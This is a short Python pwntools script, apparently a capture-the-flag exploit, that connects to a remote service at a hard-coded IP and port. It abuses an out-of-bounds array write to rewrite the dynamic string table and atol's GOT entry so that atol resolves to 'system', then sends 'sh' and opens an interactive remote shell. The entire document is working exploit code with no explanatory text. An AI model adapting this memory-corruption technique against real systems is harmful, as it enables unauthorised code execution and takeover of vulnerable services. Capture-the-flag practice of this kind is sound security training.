from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '200.136.213.83', 8888
r = remote(HOST, PORT)

def store(index, value):
    r.sendline(str(index))
    r.sendline(str(value))

bss = 0x8049f00
data = bss - 0x10c
atol = 0x804928e
atol_got = 0x8049910
atol_plt = 0x80483e0
strtab = 0x8049848

store(-13, bss)
store((atol - 2 - data) / 4, u32('\x00\x00sy'))
store((atol + 2 - data) / 4, u32('stem'))
store((atol + 6 - data) / 4, u32('\x00\x00\x00\x00'))
pause()
store((strtab - data) / 4, 0x8049250)
store((atol_got - data) / 4, atol_plt + 6)
r.sendline('sh')

r.interactive()
